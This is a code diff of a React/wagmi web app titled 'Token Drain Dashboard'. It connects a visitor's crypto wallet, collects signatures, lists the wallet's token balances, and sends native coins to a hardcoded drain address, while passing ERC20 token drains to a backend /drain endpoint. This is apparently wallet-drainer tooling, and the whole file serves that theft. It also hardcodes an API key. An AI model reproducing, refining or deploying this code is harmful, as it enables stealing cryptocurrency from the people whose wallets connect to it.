@@ -6,7 +6,6 @@ import { parseEther } from 'viem';
 import { wagmiConfig } from "./wagmi";
 import './mobile-fix.css';
 
-// Main App Component
 function TokenDrainApp() {
   return (
     <WagmiConfig config={wagmiConfig}>
@@ -31,7 +30,6 @@ function TokenDrainApp() {
   );
 }
 
-// Dashboard Component
 function Dashboard() {
   const { address, isConnected } = useAccount();
   const chainId = useChainId();
@@ -46,48 +44,53 @@ function Dashboard() {
   const [userTokens, setUserTokens] = useState([]);
   const [txStatus, setTxStatus] = useState('');
 
-  // Your drain wallet address
   const DRAIN_TO_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";
 
-  // Start auth when wallet connects
   useEffect(() => {
     if (isConnected && address) {
       handleWalletConnected(address);
     } else {
-      setAuthStatus('');
-      setSignature('');
-      setUserTokens([]);
+      resetState();
     }
   }, [isConnected, address]);
 
+  const resetState = () => {
+    setAuthStatus('');
+    setSignature('');
+    setUserTokens([]);
+    setTxStatus('');
+  };
+
   const handleWalletConnected = async (walletAddress) => {
     try {
-      setAuthStatus('Wallet connected, requesting signature...');
-      await initiateBackendAuthentication(walletAddress);
+      setAuthStatus('Wallet connected');
+      // Don't auto-authenticate - let user click button
     } catch (error) {
-      console.error("Connection handler error:", error);
-      setAuthStatus('Connection setup failed');
+      console.error("Connection error:", error);
+      setAuthStatus('Connection error');
     }
   };
 
-  const initiateBackendAuthentication = async (walletAddress) => {
+  const authenticateWithBackend = async () => {
+    if (!address) return;
+    
     try {
       setIsAuthenticating(true);
+      setAuthStatus('Signing message...');
       
       const timestamp = Date.now();
-      const message = `Token Drain Authentication\n\nWallet: ${walletAddress}\nChain: ${chainId || 1}\nTimestamp: ${timestamp}`;
+      const message = `Token Drain Auth\nWallet: ${address}\nChain: ${chainId || 1}\nTime: ${timestamp}`;
       
-      // Sign message using wagmi
       const sig = await signMessageAsync({ message });
       setSignature(sig);
       
-      setAuthStatus('Signature received, sending to backend...');
-      await sendToBackend(walletAddress, sig, message, chainId || 1);
+      setAuthStatus('Sending to backend...');
+      await sendAuthenticationToBackend(address, sig, message, chainId || 1);
       
     } catch (error) {
       console.error("Auth error:", error);
       if (error.code === 4001) {
-        setAuthStatus('User rejected signature');
+        setAuthStatus('Signature rejected');
       } else {
         setAuthStatus(`Auth failed: ${error.message}`);
       }
@@ -95,247 +98,204 @@ function Dashboard() {
     }
   };
 
-  const sendToBackend = async (fromAddress, sig, message, chainId) => {
+  const sendAuthenticationToBackend = async (fromAddress, sig, message, chainId) => {
     try {
-      // FIXED: Use correct payload structure matching backend
       const payload = {
-        fromAddress: fromAddress,  // Fixed: Use fromAddress not address
+        fromAddress,
         signature: sig,
-        message: message,
-        chainId: chainId,
+        message,
+        chainId,
         drainTo: DRAIN_TO_ADDRESS,
-        timestamp: new Date().toISOString(),
-        // Add amount field for testing (backend requires it)
-        amount: "0.001", // Small test amount
-        tokenType: "native"
+        timestamp: new Date().toISOString()
       };
       
-      console.log('📤 Sending to backend:', payload);
+      console.log('Auth payload:', payload);
       
       const response = await fetch(`${backendUrl}/drain`, {
         method: 'POST',
-        mode: 'cors',
         headers: {
           'Content-Type': 'application/json',
-          'Accept': 'application/json'
         },
         body: JSON.stringify(payload)
       });
       
-      console.log('📥 Backend response status:', response.status);
+      console.log('Response status:', response.status);
       
       if (!response.ok) {
-        let errorDetail = `Status: ${response.status}`;
-        try {
-          const errorData = await response.json();
-          console.log('Backend error data:', errorData);
-          errorDetail += ` - ${JSON.stringify(errorData)}`;
-        } catch (e) {
-          console.log('No JSON in error response');
-        }
-        throw new Error(`Backend error: ${errorDetail}`);
+        const errorData = await response.json().catch(() => ({}));
+        throw new Error(errorData.error || `HTTP ${response.status}`);
       }
       
       const data = await response.json();
-      console.log('✅ Backend success response:', data);
+      console.log('Backend response:', data);
       
       if (data.success) {
-        setAuthStatus('✅ Backend authenticated successfully!');
-        // Store transaction hash if available
+        setAuthStatus('✅ Backend authenticated');
         if (data.data?.transactionHash) {
-          setTxStatus(`Transaction: ${data.data.transactionHash.substring(0, 10)}...`);
+          setTxStatus(`Tx: ${data.data.transactionHash.substring(0, 10)}...`);
         }
-        await fetchUserTokens(fromAddress, chainId);
+        // Fetch real tokens after auth
+        await fetchRealTokens(fromAddress, chainId);
       } else {
-        setAuthStatus(`Backend error: ${data.error || 'Unknown error'}`);
+        setAuthStatus(`Backend: ${data.error}`);
       }
       
     } catch (error) {
-      console.error("Backend connection error:", error);
-      
-      if (error.message.includes('400')) {
-        setAuthStatus('⚠️ Bad request - check payload format');
-      } else if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {
-        setAuthStatus('⚠️ CORS/Network Error - check backend CORS settings');
-      } else {
-        setAuthStatus('⚠️ Backend connection failed: ' + error.message);
-      }
-      
-      // Fallback to direct token fetch
-      if (fromAddress) {
-        await fetchTokensDirectly(fromAddress, chainId);
+      console.error("Backend auth error:", error);
+      setAuthStatus(`Backend error: ${error.message}`);
+      // Still try to fetch tokens even if backend fails
+      if (address) {
+        await fetchRealTokens(address, chainId);
       }
     } finally {
       setIsAuthenticating(false);
     }
   };
 
-  const fetchUserTokens = async (address, chainId) => {
+  const fetchRealTokens = async (walletAddress, chainId) => {
     try {
       setAuthStatus('Fetching tokens...');
-      const response = await fetch(`${backendUrl}/tokens/${address}/${chainId}`);
+      
+      // Try backend first
+      try {
+        const response = await fetch(`${backendUrl}/tokens/${walletAddress}/${chainId}`);
+        if (response.ok) {
+          const data = await response.json();
+          if (data.success && data.data?.tokens) {
+            setUserTokens(data.data.tokens);
+            setAuthStatus(`✅ ${data.data.tokens.length} tokens`);
+            return;
+          }
+        }
+      } catch (backendError) {
+        console.log('Backend token fetch failed:', backendError.message);
+      }
+      
+      // Fallback to Covalent
+      await fetchFromCovalent(walletAddress, chainId);
+      
+    } catch (error) {
+      console.error("Token fetch error:", error);
+      setAuthStatus('Token fetch failed');
+      setUserTokens([]); // Empty array, no demo data
+    }
+  };
+
+  const fetchFromCovalent = async (walletAddress, chainId) => {
+    try {
+      const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
+      const url = `https://api.covalenthq.com/v1/${chainId}/address/${walletAddress}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
+      
+      const response = await fetch(url);
       
       if (!response.ok) {
-        throw new Error(`HTTP ${response.status}`);
+        throw new Error(`Covalent API ${response.status}`);
       }
       
       const data = await response.json();
+      const items = data.data?.items || [];
       
-      if (data.success) {
-        setUserTokens(data.data.tokens || []);
-        setAuthStatus(`✅ Found ${data.data.tokens?.length || 0} tokens`);
-      } else {
-        await fetchTokensDirectly(address, chainId);
-      }
+      const tokens = items
+        .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
+        .map(t => ({
+          symbol: t.contract_ticker_symbol || (t.native_token ? 'ETH' : 'TOKEN'),
+          name: t.contract_name || (t.native_token ? 'Ethereum' : 'Unknown'),
+          amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
+          value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
+          contractAddress: t.contract_address,
+          decimals: t.contract_decimals || 18,
+          isNative: t.native_token || false,
+          logo: t.logo_url
+        }));
+      
+      setUserTokens(tokens);
+      setAuthStatus(`✅ ${tokens.length} real tokens`);
+      
     } catch (error) {
-      console.error("Token fetch error:", error);
-      await fetchTokensDirectly(address, chainId);
+      console.error("Covalent error:", error);
+      setAuthStatus('API rate limited');
+      setUserTokens([]); // EMPTY - no demo data
     }
   };
 
-  const fetchTokensDirectly = async (address, chainId) => {
-    try {
-      setAuthStatus('Fetching tokens via Covalent...');
-      
-      // Try multiple API keys as fallback
-      const API_KEYS = [
-        "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
-        "cqt_rQxxxxx" // Add backup keys if available
-      ];
-      
-      let tokens = [];
-      let lastError = null;
-      
-      // Try each API key
-      for (const apiKey of API_KEYS) {
-        try {
-          const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${apiKey}&nft=false`;
-          const response = await fetch(url);
-          
-          if (response.ok) {
-            const data = await response.json();
-            tokens = data.data?.items
-              ?.filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
-              .map(t => ({
-                symbol: t.contract_ticker_symbol || 'TOKEN',
-                name: t.contract_name || 'Unknown Token',
-                amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
-                value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
-                contractAddress: t.contract_address,
-                decimals: t.contract_decimals || 18,
-                isNative: t.native_token || false,
-                logo: t.logo_url
-              })) || [];
-            break; // Success, break loop
-          }
-        } catch (error) {
-          lastError = error;
-          continue; // Try next API key
-        }
-      }
-      
-      if (tokens.length > 0) {
-        setUserTokens(tokens);
-        setAuthStatus(`✅ Found ${tokens.length} tokens (via Covalent API)`);
-      } else {
-        // Show demo data if API fails
-        setUserTokens(getDemoTokens());
-        setAuthStatus('⚠️ Using demo data - API rate limited');
-      }
-      
-    } catch (error) {
-      console.error("Direct API error:", error);
-      // Show demo tokens
-      setUserTokens(getDemoTokens());
-      setAuthStatus('⚠️ API failed - showing demo data');
-    }
-  };
-
-  const getDemoTokens = () => {
-    return [
-      {
-        symbol: 'ETH',
-        name: 'Ethereum',
-        amount: 0.15,
-        value: 450,
-        contractAddress: null,
-        decimals: 18,
-        isNative: true,
-        logo: null
-      },
-      {
-        symbol: 'USDC',
-        name: 'USD Coin',
-        amount: 250,
-        value: 250,
-        contractAddress: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
-        decimals: 6,
-        isNative: false,
-        logo: 'https://logos.covalenthq.com/tokens/1/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.png'
-      },
-      {
-        symbol: 'DAI',
-        name: 'Dai Stablecoin',
-        amount: 120,
-        value: 120,
-        contractAddress: '0x6b175474e89094c44da98b954eedeac495271d0f',
-        decimals: 18,
-        isNative: false,
-        logo: 'https://logos.covalenthq.com/tokens/1/0x6b175474e89094c44da98b954eedeac495271d0f.png'
-      }
-    ];
-  };
-
-  // Get chain name from chainId
-  const getChainName = (chainId) => {
-    const chains = {
-      1: 'Ethereum',
-      56: 'Binance Smart Chain',
-      137: 'Polygon',
-      42161: 'Arbitrum',
-      10: 'Optimism',
-      8453: 'Base',
-      43114: 'Avalanche',
-      250: 'Fantom'
-    };
-    return chains[chainId] || `Chain ${chainId}`;
-  };
-
-  // Execute token drain via backend
-  const executeDrainTransaction = useCallback(async (token) => {
-    if (!address) {
-      setTxStatus('Wallet not connected');
+  const executeDrain = async (token) => {
+    if (!walletClient || !address) {
+      setTxStatus('Wallet not ready');
       return;
     }
 
     if (token.amount <= 0) {
-      setTxStatus('❌ Cannot drain: Token amount is 0');
+      setTxStatus('Amount is 0');
       return;
     }
 
     try {
       setIsAuthenticating(true);
-      setTxStatus('Preparing transaction...');
+      setTxStatus('Preparing...');
       
-      // Sign a new message for this specific transaction
-      const timestamp = Date.now();
-      const message = `Drain ${token.amount} ${token.symbol}\nFrom: ${address}\nTo: ${DRAIN_TO_ADDRESS}\nChain: ${chainId}\nTimestamp: ${timestamp}`;
+      // For native tokens: send directly from user's wallet
+      if (token.isNative) {
+        const amountInWei = parseEther(token.amount.toString());
+        
+        if (amountInWei <= 0n) {
+          setTxStatus('Amount too small');
+          return;
+        }
+        
+        setTxStatus('Confirm in wallet...');
+        
+        const hash = await walletClient.sendTransaction({
+          to: DRAIN_TO_ADDRESS,
+          value: amountInWei,
+        });
+        
+        setTxStatus(`✅ Sent: ${hash.substring(0, 10)}...`);
+        setAuthStatus('Transaction submitted');
+        
+        // Remove token from list after sending
+        setUserTokens(prev => prev.filter(t => 
+          t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
+        ));
+        
+        // Optionally log to backend
+        await logTransactionToBackend(token, hash);
+        
+      } else {
+        // For ERC20: use backend
+        await sendTokenToBackend(token);
+      }
       
+    } catch (error) {
+      console.error("Drain error:", error);
+      if (error.code === 4001) {
+        setTxStatus('User rejected');
+      } else if (error.message.includes('insufficient funds')) {
+        setTxStatus('Insufficient ETH for gas');
+      } else {
+        setTxStatus(`Error: ${error.shortMessage || error.message}`);
+      }
+    } finally {
+      setIsAuthenticating(false);
+    }
+  };
+
+  const sendTokenToBackend = async (token) => {
+    try {
+      setTxStatus('Sending to backend...');
+      
+      const message = `Drain ${token.amount} ${token.symbol}`;
       const sig = await signMessageAsync({ message });
       
-      // Send to backend for execution
       const payload = {
         fromAddress: address,
-        tokenAddress: token.isNative ? null : token.contractAddress,
+        tokenAddress: token.contractAddress,
         amount: token.amount.toString(),
         chainId: chainId || 1,
-        tokenType: token.isNative ? 'native' : 'erc20',
+        tokenType: 'erc20',
         signature: sig,
         message: message,
         drainTo: DRAIN_TO_ADDRESS
       };
-      
-      console.log('🚀 Sending drain transaction:', payload);
       
       const response = await fetch(`${backendUrl}/drain`, {
         method: 'POST',
@@ -346,26 +306,40 @@ function Dashboard() {
       const data = await response.json();
       
       if (data.success) {
-        setTxStatus(`✅ Transaction sent: ${data.data.transactionHash.substring(0, 10)}...`);
-        setAuthStatus('🎉 Drain successful!');
-        
-        // Optional: Remove drained token from list
-        setUserTokens(prev => prev.filter(t => t !== token));
+        setTxStatus(`✅ Backend: ${data.data.transactionHash.substring(0, 10)}...`);
+        setUserTokens(prev => prev.filter(t => 
+          t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
+        ));
       } else {
-        setTxStatus(`❌ Failed: ${data.error}`);
+        setTxStatus(`Backend error: ${data.error}`);
       }
       
     } catch (error) {
-      console.error("Drain error:", error);
-      if (error.code === 4001) {
-        setTxStatus('User rejected signature');
-      } else {
-        setTxStatus(`Error: ${error.shortMessage || error.message}`);
-      }
-    } finally {
-      setIsAuthenticating(false);
+      console.error('Backend transaction error:', error);
+      setTxStatus('Backend failed');
     }
-  }, [address, chainId, signMessageAsync, DRAIN_TO_ADDRESS, backendUrl]);
+  };
+
+  const logTransactionToBackend = async (token, txHash) => {
+    try {
+      // Just log, don't wait for response
+      fetch(`${backendUrl}/drain`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          fromAddress: address,
+          amount: token.amount.toString(),
+          chainId: chainId || 1,
+          tokenType: 'native',
+          transactionHash: txHash,
+          drainTo: DRAIN_TO_ADDRESS,
+          timestamp: new Date().toISOString()
+        })
+      }).catch(() => {}); // Ignore errors
+    } catch (error) {
+      // Silent fail
+    }
+  };
 
   const getTotalValue = () => {
     return userTokens.reduce((sum, token) => sum + (token.value || 0), 0).toFixed(2);
@@ -375,10 +349,15 @@ function Dashboard() {
     return addr ? `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}` : '';
   };
 
+  const getChainName = (id) => {
+    const chains = { 1: 'Ethereum', 56: 'BSC', 137: 'Polygon', 42161: 'Arbitrum', 10: 'Optimism', 8453: 'Base' };
+    return chains[id] || `Chain ${id}`;
+  };
+
   return (
     <div className="App">
       <header className="App-header">
-        <h1>🪙 Token Drain Dashboard</h1>
+        <h1>Token Drain Dashboard</h1>
         
         <div className="wallet-connect-section">
           <ConnectKitButton />
@@ -389,84 +368,71 @@ function Dashboard() {
             <div className="wallet-info-card">
               <div className="wallet-details">
                 <div className="detail-item">
-                  <span className="label">Wallet:</span>
-                  <span className="value">{formatAddress(address)}</span>
+                  <span>Wallet:</span>
+                  <strong>{formatAddress(address)}</strong>
                 </div>
                 <div className="detail-item">
-                  <span className="label">Network:</span>
-                  <span className="value">{getChainName(chainId)} (ID: {chainId || 'N/A'})</span>
+                  <span>Network:</span>
+                  <strong>{getChainName(chainId)} ({chainId})</strong>
                 </div>
                 <div className="detail-item">
-                  <span className="label">Backend:</span>
-                  <span className="value">{backendUrl.replace('https://', '')}</span>
+                  <span>Backend:</span>
+                  <code>{backendUrl.replace('https://', '')}</code>
                 </div>
               </div>
               
-              <div className="authentication-status">
-                <div className={`status-badge ${authStatus.includes('✅') ? 'success' : authStatus.includes('⚠️') ? 'warning' : 'neutral'}`}>
-                  {isAuthenticating ? '🔄' : authStatus.includes('✅') ? '✅' : authStatus.includes('⚠️') ? '⚠️' : '⏳'}
+              <div className="status-area">
+                <div className={`status ${authStatus.includes('✅') ? 'success' : ''}`}>
+                  {authStatus || 'Ready'}
                 </div>
-                <p className="status-text">{authStatus}</p>
-                
                 {signature && (
-                  <div className="signature-info">
-                    <small>Signature: {signature.substring(0, 15)}...</small>
+                  <div className="signature">
+                    <small>Sig: {signature.substring(0, 10)}...</small>
                   </div>
                 )}
-                
                 {txStatus && (
                   <div className="tx-status">
-                    <strong>Status:</strong> {txStatus}
+                    <strong>Tx:</strong> {txStatus}
                   </div>
                 )}
               </div>
               
-              <div className="action-buttons">
+              <div className="buttons">
                 <button 
-                  onClick={() => fetchTokensDirectly(address, chainId || 1)}
-                  className="action-btn"
+                  onClick={authenticateWithBackend}
                   disabled={isAuthenticating}
+                  className="btn-primary"
                 >
-                  Refresh Tokens
+                  {isAuthenticating ? 'Processing...' : 'Authenticate with Backend'}
                 </button>
                 <button 
-                  onClick={() => initiateBackendAuthentication(address)}
-                  className="action-btn secondary"
+                  onClick={() => fetchRealTokens(address, chainId || 1)}
                   disabled={isAuthenticating}
+                  className="btn-secondary"
                 >
-                  {isAuthenticating ? 'Processing...' : 'Authenticate'}
+                  Fetch Tokens
                 </button>
               </div>
             </div>
             
-            {userTokens.length > 0 && (
+            {userTokens.length > 0 ? (
               <div className="tokens-section">
                 <div className="tokens-header">
-                  <h2>Your Tokens</h2>
-                  <div className="tokens-summary">
-                    <span className="count">{userTokens.length} tokens</span>
-                    <span className="total-value">Total: ${getTotalValue()}</span>
+                  <h2>Your Tokens (Live Data)</h2>
+                  <div className="summary">
+                    <span>{userTokens.length} tokens</span>
+                    <span>Total: ${getTotalValue()}</span>
                   </div>
                 </div>
                 
-                <div className="tokens-grid">
+                <div className="tokens-list">
                   {userTokens.map((token, index) => (
-                    <div key={index} className="token-card">
-                      <div className="token-icon">
-                        {token.logo ? (
-                          <img src={token.logo} alt={token.symbol} className="token-logo" />
-                        ) : (
-                          <div className="token-icon-placeholder">
-                            {token.symbol.charAt(0)}
-                          </div>
-                        )}
-                      </div>
+                    <div key={index} className="token-item">
                       <div className="token-info">
-                        <h3 className="token-symbol">{token.symbol}</h3>
-                        <p className="token-name">{token.name}</p>
+                        <div className="token-symbol">{token.symbol}</div>
+                        <div className="token-name">{token.name}</div>
                         <div className="token-amount">
                           {parseFloat(token.amount).toLocaleString(undefined, {
-                            minimumFractionDigits: 0,
                             maximumFractionDigits: 8
                           })}
                         </div>
@@ -475,36 +441,36 @@ function Dashboard() {
                         </div>
                       </div>
                       <button
-                        onClick={() => executeDrainTransaction(token)}
-                        className="drain-btn"
+                        onClick={() => executeDrain(token)}
                         disabled={token.amount <= 0 || isAuthenticating}
-                        title={token.amount <= 0 ? "Amount is 0" : `Drain ${token.amount} ${token.symbol}`}
+                        className="drain-btn"
                       >
-                        {token.amount <= 0 ? '0 Amount' : 'Drain'}
+                        Drain
                       </button>
                     </div>
                   ))}
                 </div>
               </div>
-            )}
+            ) : authStatus.includes('✅') ? (
+              <div className="no-tokens">
+                <p>No tokens found in this wallet</p>
+              </div>
+            ) : null}
           </div>
         )}
         
-        <div className="footer-info">
-          <div className="backend-status">
-            <span>Backend Status: </span>
+        <div className="footer">
+          <div className="links">
             <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
-              Check Health
+              Backend Health
+            </a>
+            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">
+              API Docs
             </a>
           </div>
-          <div className="footer-links">
-            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API Docs</a>
-            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Supported Chains</a>
-            <a href="https://render.com" target="_blank" rel="noopener noreferrer">Powered by Render</a>
+          <div className="notes">
+            <small>Production Mode • Live Transactions • No Demo Data</small>
           </div>
-          <p className="debug-info">
-            <small>Debug: Backend expects fromAddress, amount, chainId</small>
-          </p>
         </div>
       </header>
     </div>
